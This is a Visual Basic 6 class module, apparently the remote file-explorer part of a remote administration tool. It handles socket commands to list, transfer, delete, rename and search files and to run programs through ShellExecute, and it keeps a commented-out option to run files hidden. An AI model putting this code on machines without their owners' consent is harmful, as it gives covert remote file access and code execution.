VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "ClsExplorer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
' ---------------------------------------------------
' Autor:            Leandro I. Ascierto
' Date:             17 de Julio de 2010
' Web:              www.leandroascierto.com.ar
' Requirements:     Windows XP or Later
' History:          06/10/2010 First
' ---------------------------------------------------
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function DeleteObject Lib "gdi32.dll" (ByVal hObject As Long) As Long

Private Const SW_SHOWNORMAL     As Long = 1
Private Const SW_HIDE           As Long = 0

Private WithEvents cFileList    As ClsSearch
Attribute cFileList.VB_VarHelpID = -1
Private WithEvents cZip         As ClsZip
Attribute cZip.VB_VarHelpID = -1

Public ExplorerID               As Long
Private bCancel                 As Boolean
Private cColThumbnail           As Collection
Private sBufferDir              As String
Private m_Data                  As String
Private sIdThumbnail            As String
Private m_ViewMode              As Long

Private Sub Class_Initialize()
    Set cFileList = New ClsSearch
End Sub

Private Sub cFileList_FileFound(ByVal sPath As String, ByVal sFile As String, ByVal bZipFile As Boolean)
    SendDir sPath, sFile, False
End Sub

Private Sub cFileList_FolderFound(ByVal sPath As String, ByVal sFolder As String, ByVal bZipFolder As Boolean)
    SendDir sPath, sFolder, True
End Sub

Private Sub SendDir(sPath As String, sItem As String, IsFolder As Boolean)
    On Error Resume Next

    Dim Extencion As String
    Dim sFileSize As String
    Dim IDL As Long
    Dim hBitmapThumbnail As Long
    
    If Not IsFolder Then
        sFileSize = GetFileSize(sPath & sItem)
    End If
    
    IDL = GetIDListFromPath(sPath & sItem)
    sBufferDir = sBufferDir & IDL & Delimiter & sItem & Delimiter & sFileSize & Delimiter & FileDateTime(sPath & sItem) & Delimiter & GetAttr(sPath & sItem) & _
    Delimiter & CheckAccess(sPath & sItem, GENERIC_READ) & Delimiter & CheckAccess(sPath & sItem, GENERIC_WRITE) & vbCrLf
    
    If err.Number <> 0 Then
        Debug.Print sPath, sItem
        err.Clear
    End If
    
    If m_ViewMode = 1 Then
    
        If IsFolder Then
             hBitmapThumbnail = GetThumbNail(sPath & sItem, 96, 96)
        Else
    
            Extencion = UCase(GetFileExtention(sItem))
            
            
            Select Case Extencion
                        
                Case ".BMP", ".DIB", ".JPG", ".JPEG", ".JPE", ".JFIF", ".GIF", ".PNG", ".TIF", ".TIFF", ".EMF", ".WMF", ".ICO", ".CUR", _
                     ".MPG", ".AVI", ".WMV", ".MPEG"
                     hBitmapThumbnail = GetThumbNail(sPath & sItem, 96, 96)
            End Select
        
        End If
        
        If hBitmapThumbnail Then
            cColThumbnail.Add hBitmapThumbnail
            
            sIdThumbnail = sIdThumbnail & IDL & "|"
        
        End If
        
    End If
    
    If bCancel Then Exit Sub

    If Len(sBufferDir) > 512 Then
        
        WinSock32.SendData ExplorerID, 2 & Delimiter & sBufferDir & END_DATA

        If m_ViewMode = 1 Then Call SendListThumbnail

        sBufferDir = vbNullString
    End If

End Sub

Private Sub SendListThumbnail()
    Dim ArrThumbnail() As Byte
    Dim i As Long
    
    If cColThumbnail.Count Then

        If CreateListThumbnail(cColThumbnail, 96, ArrThumbnail) Then
       
            WinSock32.SendData ExplorerID, 12 & Delimiter
            WinSock32.SendData ExplorerID, sIdThumbnail & "@"
            WinSock32.SendData ExplorerID, ArrThumbnail
            WinSock32.SendData ExplorerID, END_DATA
            
        End If
        For i = 0 To cColThumbnail.Count
            DeleteObject cColThumbnail(i)
        Next
        Set cColThumbnail = New Collection
        sIdThumbnail = vbNullString
    End If
End Sub

Private Sub FreeHandleBitmap(cColl As Collection)
    Dim i As Long

End Sub



Private Sub SendFileList(ByVal sPath As String)
    On Error Resume Next
    Dim sBuffer As String
    Dim vItem As Variant
    Dim IDL As Long
    Dim IDLDrive As Long
    Dim sParentPath As String
    Dim IDLParent As Long
    Dim ClipBoardAvailable As Long
    Dim sDetails As String

    bCancel = False
    
    NormalizePath sPath
    
    If CheckAccess(sPath, GENERIC_READ) = False Then
        Debug.Print sPath
        SendError 123, "Acceso Denegado"
        Exit Sub
    End If

    IDL = GetIDListFromPath(sPath)
       
    sParentPath = GetParentPath(sPath)
        
    If sParentPath <> vbNullString Then
        IDLParent = GetIDListFromPath(sParentPath)
    End If
    
    ClipBoardAvailable = IIf(ClipBoard_Copy + ClipBoard_Cut > 0, 1, 0)
          
    sDetails = GetPathInfo(sPath, vbNullChar)

    sBuffer = 1 & Delimiter & IDL & Delimiter & sPath & Delimiter & IDLParent & Delimiter & ClipBoardAvailable & Delimiter & CheckAccess(sPath, GENERIC_WRITE) & Delimiter & sDetails & vbCrLf

    Call WinSock32.SendData(ExplorerID, sBuffer & END_DATA)

    sBufferDir = vbNullString

    Set cColThumbnail = New Collection
    sIdThumbnail = vbNullString

    With cFileList
        .CallDoEvents = True
        .Match = vbNullString
        .SpecificWord = vbNullString
        .Path = sPath
        .FilterDateTime = NoDateTimeFilter
        .FilterFileSize = NoFilterSize
        .SearchInSystemFolder = True
        .SearchHidePath = True
        .SearchInSubFolder = False
        .IgnoreCase = False
        .StartSearch
    End With

    If bCancel Then Exit Sub
                    
    If Len(sBufferDir) Then
        WinSock32.SendData ExplorerID, 2 & Delimiter & sBufferDir & END_DATA
    
        If m_ViewMode = 1 Then Call SendListThumbnail
    End If
                    
    sBufferDir = vbNullString
    
    WinSock32.SendData ExplorerID, 3 & Delimiter & END_DATA
    
End Sub

Private Sub SendDrives()
    Dim sBuffer As String
    Dim sLabel As String
    Dim vItem As Variant
    Dim IDL As Long
    
    sBuffer = 0 & Delimiter
    
    AddPathToBuffer sBuffer, 16, 7, 0
    AddPathToBuffer sBuffer, 46, 8, 1
    AddPathToBuffer sBuffer, 13, 9, 2
    AddPathToBuffer sBuffer, 14, 10, 2
    AddPathToBuffer sBuffer, 39, 11, 2

    For Each vItem In fGetDrives
        sLabel = IIf(GetDriveType(vItem) = DRIVE_REMOTE, fGetUNCPath(vItem), GetLabelDrive(vItem))
        
        If sLabel <> "" Then
            sLabel = sLabel & " (" & vItem & ")"
        Else
            sLabel = vItem
        End If
        
        IDL = GetIDListFromPath(vItem)
        
        sBuffer = sBuffer & IDL & Delimiter & sLabel & Delimiter & GetDriveIconIndex(vItem) - 6 & Delimiter & 1 & vbCrLf
    Next
    
    AddPathToBuffer sBuffer, 6, 12, 1
    AddPathToBuffer sBuffer, 8, 13, 1
    AddPathToBuffer sBuffer, 36, 14, 1
    AddPathToBuffer sBuffer, 37, 14, 1
    AddPathToBuffer sBuffer, 38, 14, 1
    
    WinSock32.SendData ExplorerID, sBuffer & END_DATA
End Sub

Private Function SendError(ByVal ErrNumber As Long, ByVal ErrDescription As String)
    Dim sBuffer As String
    sBuffer = 9 & Delimiter & ErrNumber & Delimiter & ErrDescription & END_DATA
    WinSock32.SendData ExplorerID, sBuffer
End Function

Private Function AddPathToBuffer(ByRef sBuffer As String, IDPath As Long, IconID As Long, Identation As Long)
    Dim sPath As String
    Dim sName As String
    Dim IDL As Long
        
    sPath = GetSpecialFolder(IDPath)
    
    IDL = GetIDListFromPath(sPath)
    
    sName = Right(sPath, Len(sPath) - InStrRev(sPath, "\"))
    
    If sPath <> "" And sName <> "" Then
        sBuffer = sBuffer & IDL & Delimiter & sName & Delimiter & IconID & Delimiter & Identation & vbCrLf
    End If

End Function


Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)
'
End Sub

Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHandler
    Dim Cmd() As String
    Dim sBuffer As String
    Dim DestPath As String
    Dim SourcePath As String
    Dim NamePath As String
    Dim lCounter As Long
    Dim lRet1 As Long
    Dim sBuf As String
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
    
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))
    
    
        Cmd = Split(sBuf, Delimiter)

        Select Case Cmd(0)
             

            Case 0 ' Envia la lista de archivos.
                m_ViewMode = CLng(Cmd(2))
                SendFileList GetPathFromIDList(Cmd(1))

            Case 1 ' Enviar un archivo
                Dim cCon As clsFileTransfer
                Set cCon = New clsFileTransfer
                
                If cCon.ID_Connection <> 0 Then
                    cCon.LetCommand Cmd
                    cColl.Add cCon, CStr(cCon.ID_Connection)
                End If
                
            Case 2 ' Recibir un archivo
        
                Set cCon = New clsFileTransfer
                
                If cCon.ID_Connection <> 0 Then
                    cColl.Add cCon, CStr(cCon.ID_Connection)
                    cCon.LetCommand Cmd
                    
                End If
                
            Case 3 'Eliminar
                SourcePath = GetPathFromIDList(Cmd(1))
                If SendToRecicler(SourcePath) Then
                      SendFileList GetPathFromIDList(Cmd(2))
                Else
                      SendError 3, "No se pudo eliminar " & SourcePath
                End If
                
            Case 4 ' Envia Carpetas especiales y unidades
                SendDrives
                
            Case 5 ' Cortar
                ClipBoard_Cut = Cmd(1)
                ClipBoard_Copy = 0
                
            Case 6 ' Copiar
                ClipBoard_Copy = Cmd(1)
                ClipBoard_Cut = 0
                
            Case 7 ' Ejecutar
                ShellExecute 0&, vbNullString, GetPathFromIDList(Cmd(1)), Cmd(3), "C:\", Cmd(2)
                
            'Case 8 ' Ejecutar Oculto
                'ShellExecute 0&, vbNullString, GetPathFromIDList(Cmd(1)), vbNullString, "C:\", SW_HIDE
                
            Case 9 ' Pegar
    
                If ClipBoard_Cut <> 0 Then
                
                    SourcePath = GetPathFromIDList(ClipBoard_Cut)
                    DestPath = GetPathFromIDList(Cmd(1))
                    NormalizePath DestPath
                    
                    If MovePath(SourcePath, DestPath) Then
                        SendFileList DestPath
                    Else
                        SendError 3, "No se pudo cortar " & SourcePath
                    End If
                    
                    ClipBoard_Cut = 0
                Else
                    If ClipBoard_Copy <> 0 Then
                    
                        SourcePath = GetPathFromIDList(ClipBoard_Copy)
                        DestPath = GetPathFromIDList(Cmd(1))
                        NormalizePath DestPath
                        
                        If CopyPath(SourcePath, DestPath) Then
                            SendFileList DestPath
                        Else
                            SendError 4, "No se pudo copiar " & SourcePath
                        End If
                    
                    End If
                End If
                
            Case 10 ' Nueva carpeta
            
                DestPath = GetPathFromIDList(Cmd(1))
                
                NormalizePath DestPath
    
                If Dir(DestPath & "Nueva carpeta", vbDirectory) = vbNullString Then
                    MkDir DestPath & "Nueva Carpeta"
                Else
                    lCounter = 2
                    Do While Dir(DestPath & "Nueva carpeta (" & lCounter & ")", vbDirectory) <> vbNullString
                        lCounter = lCounter + 1
                    Loop
                    MkDir DestPath & "Nueva carpeta (" & lCounter & ")"
                End If
                SendFileList DestPath
                
            Case 11 'Renombrar
                SourcePath = GetPathFromIDList(Cmd(1))
                DestPath = Left$(SourcePath, InStrRev(SourcePath, "\"))
                NormalizePath DestPath
    
                If RenamePath(SourcePath, DestPath & Cmd(2)) Then
                    SendFileList DestPath
                Else
                    SendError 2, "No se pudo cambiar el nombre a " & SourcePath
                End If
            Case 12
                bCancel = True
                
                cFileList.Cancel
                
            Case 13 'Buscar
                
                bCancel = False
                sBufferDir = vbNullString
                
                With cFileList
                    .CallDoEvents = True
                    .Match = Cmd(1)
                    .SpecificWord = Cmd(2)
                    .Path = Cmd(3)
                    .FilterDateTime = Cmd(4)
                    .MinDate = Cmd(5)
                    .MaxDate = Cmd(6)
                    .FilterFileSize = Cmd(7)
                    .MinFileSize = Cmd(8)
                    .MaxFileSize = Cmd(9)
                    .SearchInSystemFolder = Cmd(10)
                    .SearchHidePath = Cmd(11)
                    .SearchInSubFolder = Cmd(12)
                    .IgnoreCase = Not CBool(Cmd(13))
                    .SearchInZipFolder = CBool(Cmd(14))
                    .StartSearch
                End With
                   
                If bCancel Then Exit Sub
                
                If Len(sBufferDir) Then WinSock32.SendData ExplorerID, 7 & Delimiter & sBufferDir & END_DATA
                
                sBufferDir = vbNullString
    
                WinSock32.SendData ExplorerID, 8 & Delimiter & END_DATA
                
                If m_ViewMode = 1 Then Call SendListThumbnail

                
            Case 14 'Detalles
                Dim sDetails As String
                Dim hBitmapThumbnail As Long
                
                DestPath = GetPathFromIDList(Cmd(1))
                sDetails = GetPathInfo(DestPath)
                
                If sDetails <> "" Then
                    WinSock32.SendData ExplorerID, 5 & Delimiter & sDetails & END_DATA
                End If
                
                hBitmapThumbnail = GetThumbNail(DestPath, 160, 160)
                
                If hBitmapThumbnail Then
                    Dim cThumbnail As Collection
                    Dim ArrImage() As Byte
                    
                    Set cThumbnail = New Collection
                    
                    cThumbnail.Add hBitmapThumbnail
                    
                    If CreateListThumbnail(cThumbnail, 160, ArrImage) Then
                        WinSock32.SendData ExplorerID, 6 & Delimiter
                        WinSock32.SendData ExplorerID, ArrImage
                        WinSock32.SendData ExplorerID, END_DATA
                    End If
                    
                    DeleteObject hBitmapThumbnail
                End If
                
            Case 15 ' Comprimir en zip
                Set cZip = New ClsZip
                SourcePath = GetPathFromIDList(Cmd(1))
                DestPath = GetParentPath(SourcePath) & Cmd(2)
                Call cZip.ZipPath(SourcePath, DestPath)
                
            Case 16 ' Descomprimir
                Set cZip = New ClsZip
                SourcePath = GetPathFromIDList(Cmd(1))
                DestPath = GetParentPath(SourcePath) & Cmd(2)
                MkDir (DestPath)
                Call cZip.UnZipPath(SourcePath, DestPath)
                
            Case 17 'Cancelar comprimir o descomprimir
                If Not cZip Is Nothing Then
                    cZip.Cancel
                End If
                
            Case 18 'Atributos
                DestPath = GetPathFromIDList(Cmd(1))
                If PathIsFolder(DestPath) Then
                    SetAttr DestPath, Cmd(2) And Not vbDirectory
                Else
                    SetAttr DestPath, Cmd(2)
                End If
                SendFileList GetPathFromIDList(Cmd(3))
                
            Case 19 ' Abrir carpeta contenedora
                DestPath = GetParentPath(GetPathFromIDList(Cmd(1)))
                NormalizePath DestPath
                SendFileList DestPath
                
        End Select
    
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(ID, IP, Puerto, vbNullString)
        End If
    
    End If
    
    Exit Sub
    
ErrHandler:
        SendError err.Number, err.Description
End Sub


Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
'
End Sub

Private Sub Class_Terminate()
    bCancel = True
    cFileList.Cancel
    Set cFileList = Nothing
    Set cZip = Nothing
End Sub

Private Sub cZip_EndCompress(ByVal lResult As Boolean)
    WinSock32.SendData ExplorerID, 11 & Delimiter & END_DATA
End Sub

Private Sub cZip_Progress(ByVal lPercent As Long)
    WinSock32.SendData ExplorerID, 10 & Delimiter & lPercent & END_DATA
End Sub
